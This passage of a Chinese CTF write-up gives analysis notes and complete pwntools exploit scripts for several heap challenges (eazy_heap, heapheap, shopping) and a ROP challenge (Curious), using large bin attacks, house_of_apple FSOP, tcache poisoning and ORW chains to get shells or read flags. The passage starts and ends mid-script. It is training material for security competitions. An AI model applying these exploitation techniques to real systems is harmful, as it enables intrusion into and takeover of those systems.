class="string">b&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">create(<span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">malloc_hook = libc_addr - <span class="number">0x38</span> - <span class="number">0x18</span></span><br><span class="line">libcbase = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>] + <span class="number">1</span></span><br><span class="line">puts = libcbase + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &#x27;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;libcbase &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x8</span>, p32(system) + <span class="string">b&#x27;;sh;&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;cat$&#123;IFS&#125;flag.txt&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="eazy-heap"><a href="#eazy-heap" class="headerlink" title="eazy_heap"></a>eazy_heap</h4><p>IDA打开</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd245241c.png" alt="image-20240525023851106"></p><p>但是是开了一个沙盒 不能直接system</p><p>还有个uaf</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd23e1883.png" alt="image-20240525024041225"></p><p>add函数中只能，申请大chunk</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd244a175.png" alt="image-20240525024131404"></p><p>用largbinattack打stderr</p><p>然后写入house_of_apple然后用exit刷新流完成orw</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./CAT_DE&#x27;</span>)</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;car choice &gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;car choice &gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;car choice &gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;car choice &gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x450</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&quot;BBBBBBBB&quot;</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\0&quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x21a000</span> - <span class="number">0xe0</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">envrion = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x290</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">target = heap_addr + <span class="number">0x17c0</span></span><br><span class="line">ptr = heap_addr + <span class="number">0xc60</span></span><br><span class="line">edit(<span class="number">0</span>, p64(target))</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">12</span>, payload)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\xf1&quot;</span>)</span><br><span class="line">p.recv(<span class="number">7</span>)</span><br><span class="line">en_key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;en_key: &quot;</span> + <span class="built_in">hex</span>(en_key))</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span> + <span class="built_in">hex</span>(key))</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64(en_key) + p64(key)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64((heap_addr + <span class="number">0x10</span>) ^ en_key)</span><br><span class="line">edit(<span class="number">12</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x0000000700010001</span>) + p64(<span class="number">0</span>) * <span class="number">24</span> + p64(envrion - <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stdout))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd0</span>, <span class="string">&quot;A&quot;</span> * <span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x140</span> - <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">edit(<span class="number">6</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x0000000700010001</span>) + p64(<span class="number">0</span>) * <span class="number">24</span> + p64(stack))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span> + libc.address</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f497</span> + libc.address</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(stack + <span class="number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line">add(<span class="number">0xd0</span>, <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>) + orw)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h4><p>IDA打开</p><p>发现add函数内使用了 calloc 分配内存，但没有检查分配是否成功</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd258d9cc.png" alt="image-20240525024616550"></p><p>这样会导致内存泄露</p><p>同样</p><p>利用 large bin attack 向标准错误输出 , 然后写入 house_of_apple , 最后用 exit 刷新流完成 orw</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;xxxx&#x27;</span>, [port])</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, Size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(Size), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>, Content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;context&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x420</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x410</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_add = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = libc_add - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">io_list_all = libcbase + <span class="number">0x1ed5a0</span></span><br><span class="line">log.info(<span class="string">&#x27;libcbase &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;io_list_all &#x27;</span> + <span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> - <span class="number">1</span>) + <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">heap_add = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;heap_add &#x27;</span> + <span class="built_in">hex</span>(heap_add))</span><br><span class="line"></span><br><span class="line">fd = libcbase + <span class="number">0x1ecfd0</span></span><br><span class="line">payload = p64(fd) * <span class="number">2</span> + p64(heap_add) + p64(io_list_all - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x470</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">openadd = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readadd = libcbase + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writeadd = libcbase + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontextadd = libcbase + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">rdi = libcbase + <span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libcbase + <span class="number">0x000000000002601f</span></span><br><span class="line">rdx_r12 = libcbase + <span class="number">0x0000000000119431</span></span><br><span class="line">ret = libcbase + <span class="number">0x0000000000022679</span></span><br><span class="line"></span><br><span class="line">chunk_small = heap_add + <span class="number">0x850</span></span><br><span class="line">IO_wfile_jumps = libcbase + <span class="number">0x1e8f60</span></span><br><span class="line">fakeIO_add = chunk_small</span><br><span class="line">orw_add = fakeIO_add + <span class="number">0x200</span></span><br><span class="line">A = fakeIO_add + <span class="number">0x40</span></span><br><span class="line">B = fakeIO_add + <span class="number">0xe8</span> + <span class="number">0x40</span> - <span class="number">0x68</span></span><br><span class="line">C = fakeIO_add</span><br><span class="line"></span><br><span class="line">fake_IO = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO += p64(<span class="number">1</span>)</span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO += p64(fakeIO_add)</span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO += p64(A)</span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO += p64(IO_wfile_jumps)</span><br><span class="line">fake_IO += p64(orw_add) + p64(ret) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">fake_IO += p64(B) + p64(setcontextadd + <span class="number">61</span>)</span><br><span class="line"></span><br><span class="line">flag_add = orw_add + <span class="number">0x100</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">orw = p64(rdi) + p64(flag_add) + p64(rsi) + p64(<span class="number">0</span>) + p64(openadd)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>) + p64(rsi) + p64(flag_add) + p64(rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(readadd)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>) + p64(writeadd)</span><br><span class="line"></span><br><span class="line">payload = fake_IO</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += orw</span><br><span class="line">payload = payload.ljust(<span class="number">0x300</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fd2561831.png" alt="image-20240525024728264"></p><h4 id="shopping"><a href="#shopping" class="headerlink" title="shopping"></a>shopping</h4><p>IDA打开</p><p>发现漏洞点在堆输入的时候，输入长度的判断导致溢出</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd246f26a.png" alt="image-20240525024947622"></p><p>在bss上调用了函数指针</p><p><img src="https://bu.dusays.com/2024/05/25/6651fd258b869.png" alt="image-20240525025019342"></p><p>这样的话 思路就很清楚了</p><p>通过溢出篡改CALLW的指针指向system</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;attachment-11&quot;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;xxxx&#x27;</span>,[port])</span><br><span class="line">elf = ELF(path)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Enter the password:&#x27;</span>, <span class="string">&quot;I&#x27;m ready for shopping&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, n, content=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Action:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Item ID:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Quantity:&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"><span class="keyword">if</span> content == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Add gift message? (0/1):&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Add gift message? (0/1):&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;Message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">add(<span class="number">0x4000</span>, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4000</span>, <span class="number">262</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x3FF0</span>)</span><br><span class="line"><span class="comment"># 溢出，修改thread_arena，将bss上的fake_chunk接到fastbin里</span></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x50</span> + p32(<span class="number">0</span>) + p32(<span class="number">3</span>) + <span class="number">10</span> * p64(<span class="number">0x60201d</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0xB</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(system_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fd25d6b0b.png" alt="image-20240525025342382"></p><h3 id="擂台题-4"><a href="#擂台题-4" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="Curious"><a href="#Curious" class="headerlink" title="Curious"></a>Curious</h4><p>没什么好说的</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;xxxx&#x27;</span>, port)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000452af7</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000483b85</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000446ef9</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000483b85</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401912</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040181f</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000446ef9</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += 